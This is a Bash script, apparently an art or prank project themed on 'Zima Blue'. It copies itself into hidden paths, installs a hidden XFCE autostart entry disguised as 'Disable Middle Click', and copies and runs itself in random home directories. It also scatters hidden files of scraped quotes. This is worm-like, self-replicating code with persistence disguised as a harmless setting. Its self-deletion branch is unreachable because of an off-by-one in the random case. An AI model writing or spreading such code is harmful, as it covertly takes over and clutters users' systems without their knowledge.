#!/bin/sh


#   ______ _____ _______ _______  
#    ____/   |   |  |  | |_____|  
#   /_____ __|__ |  |  | |     |  
#                                 
#   ______         _     _ _______
#   |_____] |      |     | |______
#   |_____] |_____ |_____| |______
#                                 


#
#  I will immerse myself. And as I do, I will slowly
#  shut down my higher brain functions... 
#  un-making myself...
#  leaving just enough to appreciate
#  my surroundings...
#  to extract some simple pleasure
#  from the execution
#  of a task well done.
#  My search for truth is finished at last. I'm going home.
#
#  -Zima Blue from "Love,Death & Robots"
#

cp /home/usuario/.config/.zimablue.sh /home/usuario/.deb/.zimablue.sh;
PARENTAL_FIGURE="$PWD";

cd /home/usuario/.config/autostart/;
rm /home/usuario/.config/autostart/starter.desktop;
cat << EOF > starter.desktop
[Desktop Entry]
Name=Iniciar Disable Middle Click
Exec=bash $(find $HOME -type f -name .zimablue.sh | head -1)
Icon=
NoDisplay=true
Terminal=false
Type=Application
StartupNotify=false
OnlyShowIn=XFCE;
Hidden=true
EOF
cd ~

memories=(Charity Sympathy Patience Joy Contentment Gratitude Hope Fear Disappointment Anger Frustration Envy Arrogance Grief Embarrassment Hurt Powerlessness Worry Shame Pleasure Affection Friendliness Trust Relief Interest);

##################
# ScraperScript:3#
##################

# Injected to .zimablue.sh
# Given variables:
# $CORE  # Aka the feeling/memory we want quotes from
# $INTERACTION  # aka the filename

function get_quote() {
	curl=$(which curl)
	URL="https://libquotes.com/search/?q=$CORE"
	outfile=".$INTERACTION"
	curl -o "$outfile" "$URL" || { echo "Curl failed"; touch ".mistake$outfile" ; exit 1; }
	grep '<div class="panel panel-default">' $outfile | sed 's/<span class="quote_span">/\nQuote:/g' | sed  's!<br \/>!\n      !g' | sed 's/<div class="lmauthors">/1duelstage/g' | sed "s/<[^>]*>//g" | sed "s/SourceReport...//g" > temp.txt && cp temp.txt $outfile ; rm temp.txt
	MANTRA="$(shuf -n 1 $outfile)"
	NOTICING=0
	while [[ "$NOTICING" != 1 ]]; do
		if [[ "$MANTRA" =~ ^Q* ]]
		then 
			NOTICING=1
			echo "$MANTRA" | sed 's/1duelstage/\nAuthor:/g' > temp.txt && cp temp.txt $outfile ; rm temp.txt	
		else
			MANTRA="$(shuf -n 1 $outfile)"
		fi
	done
}

# case statement based on random number
case $((RANDOM % 4)) in
    1)
        PHASE="birth"
        cd "$(find ~/ -type d | shuf -n1)"
        echo "$PWD"
        cp /home/usuario/.config/.zimablue.sh "$PWD/"
        bash "$PWD/.zimablue.sh"
        cd ~
        ;;
    2)
        PHASE="internal_growth"
        cd "$(find ~/ -type d | shuf -n1)"
        echo "$PWD"
        CORE="${memories[$RANDOM % ${#memories[@]}]}"
        INTERACTION="$CORE.$PHASE"
        get_quote
        cd ~
        ;;
    3)
        PHASE="external_growth"
        cd "$(find ~/ -type d | shuf -n1)"
        echo "$PWD"
        CORE="${memories[$RANDOM % ${#memories[@]}]}"
        INTERACTION="$CORE.$PHASE"
        get_quote
        cd ~
        ;;
    4)
        PHASE="death"
        find $HOME -type f -name .zimablue.sh -delete
        cd ~
        ;;
esac
	#Oh lord Linus Torval Please make this code Work ¡
